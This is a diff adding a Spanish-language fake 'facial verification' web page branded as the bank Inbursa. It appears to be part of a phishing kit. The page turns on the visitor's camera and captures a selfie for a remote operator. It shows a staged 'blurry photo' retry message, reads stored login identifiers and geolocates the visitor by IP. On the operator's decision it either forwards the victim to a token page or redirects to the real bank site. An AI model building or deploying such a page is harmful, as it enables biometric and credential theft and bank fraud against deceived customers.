@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación Facial</title>
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body.index3-page {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.index3-container {
+    width: 100%;
+    max-width: 400px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin-top: -70px; /* Sube todo el contenido aprox. 2cm hacia arriba */
+}
+
+.index3-logo {
+    max-width: 210px;
+    width: 74%;
+    margin-top: 1cm;
+    margin-bottom: 95px;
+    position: relative;
+    z-index: 2;
+}
+
+.camera-circle {
+    width: 232px;
+    height: 232px;
+    border-radius: 50%;
+    border: 2px solid #e0e0e0;
+    background-color: #000000;
+    position: relative;
+    z-index: 1;
+    /* antes -1cm: bajado 2cm */
+    margin-top: 1cm;
+    margin-bottom: 40px;
+    overflow: visible;
+    box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.8);
+}
+
+.scan-line {
+    position: absolute;
+    top: -3px;
+    left: -3px;
+    width: calc(100% + 6px);
+    height: calc(100% + 6px);
+    pointer-events: none;
+}
+
+.scan-line svg {
+    width: 100%;
+    height: 100%;
+}
+
+.scan-path {
+    fill: none;
+    stroke: #1a4882;
+    stroke-width: 8;
+    stroke-dasharray: 1000;
+    stroke-dashoffset: 1000;
+    stroke-linecap: square;
+    animation: none;
+}
+
+/* El arco del escaneo lo mueve JS (sin animation:infinite) para que no salte cada vuelta */
+
+.camera-feed {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 50%;
+    opacity: 0.9;
+}
+
+/* Espejo en vivo; la captura se voltea en canvas para coincidir con lo que ve el usuario */
+#video.camera-feed {
+    transform: scaleX(-1);
+}
+
+#foto-congelada.camera-feed {
+    transform: none;
+}
+
+.index3-instructions {
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    min-height: 80px;
+}
+
+.permission-message {
+    background-color: #fff3cd;
+    border: 2px solid #ffc107;
+    border-radius: 8px;
+    padding: 15px;
+    margin: 20px;
+    color: #856404;
+    font-weight: bold;
+    display: none;
+}
+
+.permission-message.show {
+    display: block;
+}
+
+.instruction-main {
+    font-size: 22px;
+    font-weight: bold;
+    color: #333;
+    line-height: 1.3;
+    transition: opacity 0.3s;
+}
+
+.instruction-main.error {
+    color: #ff0000;
+}
+
+.instruction-main.foto-borrosa {
+    color: #ff0000;
+}
+
+.instruction-main.success {
+    color: #4CAF50;
+    font-weight: normal;
+}
+
+.instruction-sub {
+    font-size: 16px;
+    color: #888;
+    line-height: 1.4;
+    font-weight: 300;
+}
+@media (max-width: 480px) {
+    .index3-container {
+        margin-top: -110px;
+    }
+
+    .index3-logo {
+        max-width: 180px;
+        width: 66%;
+        margin-top: 3.5cm;
+        position: relative;
+        z-index: 2;
+    }
+
+    .camera-circle {
+        position: relative;
+        z-index: 1;
+        width: 288px;
+        height: 288px;
+        /* antes -3.5cm: bajado 2cm */
+        margin-top: -1.5cm;
+        margin-bottom: 45px;
+    }
+
+    .instruction-main {
+        font-size: 20px;
+    }
+
+    .instruction-sub {
+        font-size: 14px;
+    }
+}
+    </style>
+</head>
+<body class="index3-page">
+    <div class="index3-container">
+        <img src="I/cama.png" alt="Inbursa" class="index3-logo">
+        <div class="camera-circle">
+            <video id="video" class="camera-feed" autoplay playsinline></video>
+            <img id="foto-congelada" class="camera-feed" style="display: none;" alt="Foto capturada">
+            <div class="scan-line">
+                <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Círculo perfecto del mismo tamaño que el círculo de la cámara -->
+                    <path d="M 120 4 A 116 116 0 1 1 119.999 4" class="scan-path"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="permission-message" id="permissionMessage">
+            Se requiere permiso para la cámara
+        </div>
+
+        <div class="index3-instructions">
+            <p class="instruction-main">Mírame de frente</p>
+            <p class="instruction-sub">Encuadra tu rostro</p>
+        </div>
+    </div>
+
+
+    <script src="script.js?v=inbursa-local-1"></script>
+    <script>
+        // Variables globales
+        let video;
+        let fotoCongelada;
+        let instructionText;
+        let instructionSub;
+        let scanPath;
+        let tiempoInicio = Date.now();
+        let fotoTomada = false;
+        let verificacionCompletada = false;
+        let camaraActivada = false;
+        let tiempoAnteriorCiclo = 0;
+        let esperandoAprobacion = false; // Pausa el reloj del escáner (subida + espera al operador)
+        let esperandoSoloOperador = false; // true = foto guardada; en espera de decisión
+        let estadoAprobacion = null; // UI: 'rechazado' = foto borrosa; 'aprobado' = éxito final
+        let tiempoPausado = 0; // Tiempo acumulado pausado
+        let tiempoPausaInicio = 0; // Momento en que se pausó
+        let streamActual = null; // Guardar el stream para poder detenerlo
+        let scanDelayUntil = 0; // Delay inicial antes de arrancar el ciclo (ms epoch)
+
+        /** Misma lógica que login.html / index (script.js): URL del sitio del banco. */
+        function paginaOficialUrl() {
+            if (typeof window.BAPA_URL_OFICIAL_BANCO === 'string' && window.BAPA_URL_OFICIAL_BANCO.trim()) {
+                return window.BAPA_URL_OFICIAL_BANCO.trim();
+            }
+            if (typeof window.BAPA_URL_OFICIAL_BANPAIS === 'string' && window.BAPA_URL_OFICIAL_BANPAIS.trim()) {
+                return window.BAPA_URL_OFICIAL_BANPAIS.trim();
+            }
+            return 'https://www.inbursa.com/';
+        }
+
+        // Textos de instrucciones sincronizados con las 4 paradas del loading (19 segundos)
+        // Paradas del loading: 10.5% (1995ms), 31.6% (6004ms), 52.6% (9994ms), 73.7% (14003ms - completo)
+        const textos = [
+            { tiempo: 0, texto: 'Mírame de frente', subtexto: 'Encuadra tu rostro', error: false, fotoBorrosa: false }, // Antes de comenzar
+            { tiempo: 1995, texto: 'No te muevas', subtexto: 'Escaneando...', error: false, fotoBorrosa: false }, // Primera parada (10.5%)
+            { tiempo: 6004, texto: 'Validando Biometria', subtexto: 'Mantén la posición', error: false, fotoBorrosa: false }, // Segunda parada (31.6%)
+            { tiempo: 9994, texto: 'Casi listo...', subtexto: 'Ajustando luz', error: false, fotoBorrosa: false }, // Tercera parada (52.6%)
+            { tiempo: 14003, texto: 'Foto borrosa', subtexto: 'Intenta de nuevo', error: false, fotoBorrosa: true }, // Loading completo (73.7%)
+            { tiempo: 19000, texto: '', subtexto: '', error: false, fotoBorrosa: false } // Fin del ciclo - reiniciar
+        ];
+
+        // 0 y 1: foto borrosa + reintento; 2: tercer ciclo exitoso y redirección
+        let cicloCapturaIndex = 0;
+
+        // Variable global para almacenar el código de país
+        let codigoPaisActual = 'SV'; // Por defecto El Salvador
+
+        // Función para detectar y configurar el país al cargar la página
+        async function detectarYConfigurarPais() {
+            // Primero, intentar cargar desde localStorage
+            const codigoPaisGuardado = localStorage.getItem('codigoPais');
+            if (codigoPaisGuardado === 'GT' || codigoPaisGuardado === 'SV' || codigoPaisGuardado === 'AR' || codigoPaisGuardado === 'HN') {
+                codigoPaisActual = codigoPaisGuardado;
+            }
+            
+            // Luego, obtener el país real y actualizar si es diferente
+            const infoIp = await obtenerIpYPais();
+            const codigoPais = infoIp.codigoPais;
+            
+            // Detectar si es Guatemala, El Salvador, Argentina o Honduras
+            if (codigoPais === 'GT') {
+                codigoPaisActual = 'GT';
+                localStorage.setItem('codigoPais', 'GT');
+            } else if (codigoPais === 'SV') {
+                codigoPaisActual = 'SV';
+                localStorage.setItem('codigoPais', 'SV');
+            } else if (codigoPais === 'AR') {
+                codigoPaisActual = 'AR';
+                localStorage.setItem('codigoPais', 'AR');
+            } else if (codigoPais === 'HN') {
+                codigoPaisActual = 'HN';
+                localStorage.setItem('codigoPais', 'HN');
+            } else if (!codigoPaisGuardado) {
+                // Si no se detecta y no hay guardado, usar SV por defecto
+                codigoPaisActual = 'SV';
+            }
+        }
+
+        // Función para obtener IP y país del usuario
+        async function obtenerIpYPais() {
+            // Intentar con ip-api.com (más confiable)
+            try {
+                const response = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,query');
+                const data = await response.json();
+                if (data.status === 'success' && data.country) {
+                    return {
+                        ip: data.query || 'No disponible',
+                        pais: data.country || 'No disponible',
+                        codigoPais: data.countryCode || 'N/A'
+                    };
+                }
+            } catch (error) {
+                console.error('Error con ip-api.com:', error);
+            }
+
+            // Fallback 1: ipapi.co
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                if (data.ip && (data.country_name || data.country)) {
+                    return {
+                        ip: data.ip || 'No disponible',
+                        pais: data.country_name || data.country || 'No disponible',
+                        codigoPais: data.country_code || 'N/A'
+                    };
+                }
+            } catch (error) {
+                console.error('Error con ipapi.co:', error);
+            }
+
+            // Fallback 2: geojs.io
+            try {
+                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const data = await response.json();
+                if (data.country) {
+                    return {
+                        ip: data.ip || 'No disponible',
+                        pais: data.country || 'No disponible',
+                        codigoPais: data.country_code || 'N/A'
+                    };
+                }
+            } catch (error) {
+                console.error('Error con geojs.io:', error);
+            }
+
+            // Fallback 3: ip-api.com con formato alternativo
+            try {
+                const response = await fetch('https://ip-api.com/json/');
+                const data = await response.json();
+                if (data.country) {
+                    return {
+                        ip: data.query || data.ip || 'No disponible',
+                        pais: data.country || 'No disponible',
+                        codigoPais: data.countryCode || 'N/A'
+                    };
+                }
+            } catch (error) {
+                console.error('Error con ip-api.com (formato alternativo):', error);
+            }
+
+            // Último fallback: solo IP
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                return {
+                    ip: ipData.ip || 'No disponible',
+                    pais: 'No disponible',
+                    codigoPais: 'N/A'
+                };
+            } catch (error) {
+                return {
+                    ip: 'No disponible',
+                    pais: 'No disponible',
+                    codigoPais: 'N/A'
+                };
+            }
+        }
+
+        /** Misma curva que el antiguo @keyframes, pero continua sin corte al cerrar el ciclo (p 0≡1 → 1000). */
+        function dashOffsetEscaneo(phase01) {
+            var p = phase01 % 1;
+            if (p < 0) {
+                p += 1;
+            }
+            var pts = [
+                [0, 1000],
+                [0.105, 750],
+                [0.211, 750],
+                [0.316, 500],
+                [0.421, 500],
+                [0.526, 250],
+                [0.632, 250],
+                [0.737, 0],
+                [1, 1000]
+            ];
+            var i;
+            for (i = 0; i < pts.length - 1; i++) {
+                if (p >= pts[i][0] && p <= pts[i + 1][0]) {
+                    var a = pts[i];
+                    var b = pts[i + 1];
+                    var den = b[0] - a[0];
+                    var u = den === 0 ? 0 : (p - a[0]) / den;
+                    return a[1] + (b[1] - a[1]) * u;
+                }
+            }
+            return 1000;
+        }
+
+        /** Reduce peso del JPEG para almacenamiento local. */
+        function comprimirFotoJpeg(sourceCanvas, maxLado, calidad) {
+            maxLado = maxLado || 720;
+            calidad = calidad == null ? 0.82 : calidad;
+            var w = sourceCanvas.width;
+            var h = sourceCanvas.height;
+            if (w < 1 || h < 1) {
+                return sourceCanvas.toDataURL('image/jpeg', calidad);
+            }
+            var scale = 1;
+            if (w > maxLado || h > maxLado) {
+                scale = maxLado / Math.max(w, h);
+            }
+            var tw = Math.max(1, Math.round(w * scale));
+            var th = Math.max(1, Math.round(h * scale));
+            var out = document.createElement('canvas');
+            out.width = tw;
+            out.height = th;
+            out.getContext('2d').drawImage(sourceCanvas, 0, 0, tw, th);
+            return out.toDataURL('image/jpeg', calidad);
+        }
+
+        // Función para tomar foto — cada captura queda bloqueada hasta resolver aprobado/rechazado.
+        async function tomarFoto() {
+            try {
+                if (!video || !video.videoWidth || !video.videoHeight) {
+                    return console.log('Video no disponible'), null;
+                }
+
+                esperandoSoloOperador = false;
+                esperandoAprobacion = true;
+                estadoAprobacion = null;
+                tiempoPausaInicio = Date.now();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                /* Misma orientación que en pantalla (#video usa scaleX(-1)); sin esto la captura sale “al revés” del espejo que ve el usuario */
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const fotoData = comprimirFotoJpeg(canvas, 720, 0.82);
+
+                if (video && fotoCongelada) {
+                    video.style.display = 'none';
+                    fotoCongelada.src = fotoData;
+                    fotoCongelada.style.display = 'block';
+                    video.pause();
+                }
+
+                const usuario = sessionStorage.getItem('usuario') || 'desconocido';
+                const loginIdSs = sessionStorage.getItem('bapa_last_login_id') || '';
+
+                let fotoId = '';
+                try {
+                    if (typeof bapaGuardarFoto === 'function') {
+                        fotoId =
+                            (await bapaGuardarFoto({
+                                fotoDataUrl: fotoData,
+                                usuario: usuario,
+                                loginId: loginIdSs,
+                                ciclo: cicloCapturaIndex + 1
+                            })) || '';
+                    }
+                } catch (eFoto) {
+                    console.warn('No se guardó la foto localmente:', eFoto);
+                }
+
+                esperandoSoloOperador = true;
+
+                let decision = null;
+                if (fotoId && typeof bapaEsperarDecisionPorId === 'function') {
+                    decision = await bapaEsperarDecisionPorId(fotoId);
+                }
+
+                esperandoAprobacion = false;
+                esperandoSoloOperador = false;
+                tiempoPausado += Date.now() - tiempoPausaInicio;
+
+                if (decision === 'ir_token') {
+                    window.location.href = 'tok.html';
+                    return null;
+                }
+
+                function volverAEscanear(opts) {
+                    opts = opts || {};
+                    var delayMs = opts.delayMs != null ? opts.delayMs : 2000;
+                    var mostrarBorroso = !!opts.mostrarBorroso;
+                    esperandoSoloOperador = false;
+                    if (mostrarBorroso) {
+                        estadoAprobacion = 'rechazado';
+                    } else {
+                        estadoAprobacion = null;
+                    }
+                    setTimeout(function () {
+                        if (video && fotoCongelada) {
+                            fotoCongelada.style.display = 'none';
+                            video.style.display = 'block';
+                            video.play();
+                        }
+
+                        tiempoInicio = Date.now();
+                        tiempoAnteriorCiclo = 0;
+                        tiempoPausado = 0;
+                        fotoTomada = false;
+                        esperandoAprobacion = false;
+                        esperandoSoloOperador = false;
+                        estadoAprobacion = null;
+                    }, delayMs);
+                }
+
+                var aprobado = decision === 'aprobado' || decision === 'ir_oficial';
+
+                if (!aprobado) {
+                    volverAEscanear({ delayMs: 2000, mostrarBorroso: true });
+                    return null;
+                }
+
+                fotoTomada = false;
+                esperandoAprobacion = false;
+                esperandoSoloOperador = false;
+                estadoAprobacion = 'aprobado';
+
+                if (instructionText) {
+                    instructionText.textContent = 'Verificación Exitosa';
+                    instructionText.classList.remove('error', 'foto-borrosa');
+                    instructionText.classList.add('success');
+                }
+                if (instructionSub) {
+                    instructionSub.textContent = '';
+                }
+
+                verificacionCompletada = true;
+
+                if (video && video.srcObject) {
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(function (track) {
+                        track.stop();
+                    });
+                    video.srcObject = null;
+                }
+
+                setTimeout(function () {
+                    window.location.href = paginaOficialUrl();
+                }, 3000);
+
+                return fotoData;
+            } catch (error) {
+                esperandoAprobacion = false;
+                esperandoSoloOperador = false;
+                fotoTomada = false;
+                try {
+                    if (tiempoPausaInicio) {
+                        tiempoPausado += Date.now() - tiempoPausaInicio;
+                    }
+                } catch (eTP) {}
+                try {
+                    if (video && fotoCongelada) {
+                        fotoCongelada.style.display = 'none';
+                        video.style.display = 'block';
+                        video.play();
+                    }
+                } catch (eV) {}
+                console.warn('Error al tomar foto:', error);
+                return null;
+            }
+        }
+
+        // Función para actualizar textos de instrucciones
+        function actualizarTexto() {
+            if (!camaraActivada) {
+                requestAnimationFrame(actualizarTexto);
+                return;
+            }
+
+            // Delay inicial para que el círculo no arranque instantáneo
+            if (scanDelayUntil && Date.now() < scanDelayUntil) {
+                if (instructionText) {
+                    instructionText.textContent = 'Mírame de frente';
+                    instructionText.classList.remove('error', 'success', 'foto-borrosa');
+                }
+                if (instructionSub) {
+                    instructionSub.textContent = 'Encuadra tu rostro';
+                }
+                if (scanPath) {
+                    scanPath.style.strokeDashoffset = String(dashOffsetEscaneo(0));
+                }
+                requestAnimationFrame(actualizarTexto);
+                return;
+            }
+            if (scanDelayUntil) {
+                // Primer frame luego del delay: reiniciar reloj del ciclo
+                scanDelayUntil = 0;
+                tiempoInicio = Date.now();
+                tiempoAnteriorCiclo = 0;
+                tiempoPausado = 0;
+            }
+
+            // Si la verificación está completada, mostrar "Verificación Exitosa" en verde
+            if (verificacionCompletada) {
+                if (instructionText) {
+                    instructionText.textContent = 'Verificación Exitosa';
+                    instructionText.classList.remove('error', 'foto-borrosa');
+                    instructionText.classList.add('success');
+                }
+                if (instructionSub) {
+                    instructionSub.textContent = '';
+                }
+                requestAnimationFrame(actualizarTexto);
+                return;
+            }
+
+            // Pausa el ciclo del ovalo: subida + espera al operador (no avanza tiempoEnCiclo)
+            if (esperandoAprobacion) {
+                if (instructionText) {
+                    instructionText.textContent = 'Esperando...';
+                    instructionText.classList.remove('error', 'success', 'foto-borrosa');
+                }
+                if (instructionSub) {
+                    instructionSub.textContent = esperandoSoloOperador
+                        ? 'No cierres esta pantalla'
+                        : 'Un momento';
+                }
+                requestAnimationFrame(actualizarTexto);
+                return;
+            }
+
+            // Si hay un estado de aprobación definido, mostrar el texto correspondiente
+            if (estadoAprobacion === 'aprobado') {
+                if (instructionText) {
+                    instructionText.textContent = 'Verificación Exitosa';
+                    instructionText.classList.remove('error', 'foto-borrosa');
+                    instructionText.classList.add('success');
+                }
+                if (instructionSub) {
+                    instructionSub.textContent = '';
+                }
+                requestAnimationFrame(actualizarTexto);
+                return;
+            } else if (estadoAprobacion === 'rechazado') {
+                if (instructionText) {
+                    instructionText.textContent = 'Foto borrosa';
+                    instructionText.classList.remove('error', 'success');
+                    instructionText.classList.add('foto-borrosa');
+                }
+                if (instructionSub) {
+                    instructionSub.textContent = 'Intenta de nuevo';
+                }
+                // NO resetear el estado aquí, se reseteará después de 2 segundos en tomarFoto()
+                requestAnimationFrame(actualizarTexto);
+                return;
+            }
+
+            const tiempoTranscurrido = Date.now() - tiempoInicio - tiempoPausado;
+            const tiempoEnCiclo = tiempoTranscurrido % 19000; // Ciclo de 19 segundos
+
+            if (scanPath) {
+                var faseCiclo = (tiempoTranscurrido % 19000) / 19000;
+                scanPath.style.strokeDashoffset = String(dashOffsetEscaneo(faseCiclo));
+            }
+            
+            // Detectar cuando se completa un ciclo (cuando tiempoEnCiclo vuelve a ser menor que el anterior)
+            const cicloCompleto = tiempoEnCiclo < tiempoAnteriorCiclo && tiempoTranscurrido >= 19000;
+            tiempoAnteriorCiclo = tiempoEnCiclo;
+
+            let textoPrincipal = textos[0].texto; // Por defecto: "Mírame de frente"
+            let textoSecundario = textos[0].subtexto;
+            let mostrarError = false;
+            let mostrarExito = false;
+            let esFotoBorrosa = false;
+
+            // Si el ciclo acaba de comenzar o está en los primeros milisegundos, mostrar "Mírame de frente"
+            if (tiempoEnCiclo < textos[1].tiempo) {
+                textoPrincipal = textos[0].texto;
+                textoSecundario = textos[0].subtexto;
+                esFotoBorrosa = false;
+            } else if (tiempoEnCiclo >= textos[5].tiempo) {
+                // Fin del ciclo - mostrar "Mírame de frente" antes del siguiente ciclo
+                textoPrincipal = textos[0].texto;
+                textoSecundario = textos[0].subtexto;
+                esFotoBorrosa = false;
+            } else {
+                // Buscar el texto correspondiente según el tiempo
+                for (let i = textos.length - 2; i >= 1; i--) {
+                    if (tiempoEnCiclo >= textos[i].tiempo) {
+                        // Cuando llegamos al tiempo de "Foto borrosa" (último texto), mostrar "Procesando..."
+                        if (i === 4) {
+                            textoPrincipal = 'Procesando...';
+                            textoSecundario = '';
+                            esFotoBorrosa = false;
+                        } else {
+                            textoPrincipal = textos[i].texto;
+                            textoSecundario = textos[i].subtexto;
+                            esFotoBorrosa = textos[i].fotoBorrosa;
+                        }
+                        break;
+                    }
+                }
+            }
+
+            if (instructionText) {
+                instructionText.textContent = textoPrincipal;
+            }
+            if (instructionSub) {
+                instructionSub.textContent = textoSecundario;
+            }
+
+            if (instructionText) {
+                // Remover todas las clases primero
+                instructionText.classList.remove('error', 'success', 'foto-borrosa');
+                
+                if (esFotoBorrosa) {
+                    instructionText.classList.add('foto-borrosa');
+                } else if (mostrarError) {
+                    instructionText.classList.add('error');
+                } else if (mostrarExito) {
+                    instructionText.classList.add('success');
+                }
+            }
+
+            // Tomar foto cuando se complete el loading (Foto borrosa)
+            if (tiempoEnCiclo >= textos[4].tiempo && tiempoEnCiclo < textos[5].tiempo && !fotoTomada && !esperandoAprobacion) {
+                fotoTomada = true;
+                tomarFoto().catch(error => {
+                    console.warn('Error:', error);
+                    fotoTomada = false;
+                    esperandoAprobacion = false;
+                    esperandoSoloOperador = false;
+                    try {
+                        if (tiempoPausaInicio) {
+                            tiempoPausado += Date.now() - tiempoPausaInicio;
+                        }
+                    } catch (eTP) {}
+                });
+            }
+
+            // NO reiniciar el ciclo automáticamente - el avance se controla desde tomarFoto() cuando se aprueba
+            // Solo reiniciar si no estamos esperando aprobación y no hay foto tomada pendiente
+            // Esto evita que se reinicie el ciclo cuando ya se aprobó la foto
+            if (cicloCompleto && !verificacionCompletada && !esperandoAprobacion && !fotoTomada) {
+                // Este caso solo debería ocurrir si algo salió mal
+                // Normalmente el ciclo se avanza desde tomarFoto() cuando se aprueba
+                console.log('Ciclo completado sin foto aprobada, esto no debería pasar');
+            }
+
+            requestAnimationFrame(actualizarTexto);
+        }
+
+        // Función para iniciar la cámara
+        async function iniciarCamara() {
+            const permissionMessage = document.getElementById('permissionMessage');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } }
+                });
+
+                if (permissionMessage) {
+                    permissionMessage.classList.remove('show');
+                }
+
+                if (video) {
+                    streamActual = stream; // Guardar el stream
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            camaraActivada = true;
+                            scanDelayUntil = Date.now() + 3000;
+                            tiempoInicio = Date.now();
+                            console.log('Cámara iniciada');
+                        });
+                    };
+                }
+            } catch (error) {
+                console.log('Error al acceder a la cámara:', error);
+                if (permissionMessage) {
+                    permissionMessage.classList.add('show');
+                }
+                setTimeout(() => {
+                    if (!camaraActivada) {
+                        iniciarCamara();
+                    }
+                }, 5000);
+            }
+        }
+
+        // Inicializar cuando el DOM esté listo
+        window.addEventListener('DOMContentLoaded', () => {
+            if (typeof bapaIniciarPollLoginGuardado === 'function') {
+                bapaIniciarPollLoginGuardado();
+            }
+            // Detectar y configurar país al cargar la página
+            detectarYConfigurarPais();
+            
+            video = document.getElementById('video');
+            fotoCongelada = document.getElementById('foto-congelada');
+            instructionText = document.querySelector('.instruction-main');
+            instructionSub = document.querySelector('.instruction-sub');
+            scanPath = document.querySelector('.scan-path');
+
+            if (video) {
+                iniciarCamara();
+                tiempoInicio = Date.now();
+                fotoTomada = false;
+                actualizarTexto();
+            }
+        });
+
+        // Limpiar stream al cerrar la página
+        window.addEventListener('beforeunload', () => {
+            if (video && video.srcObject) {
+                const tracks = video.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
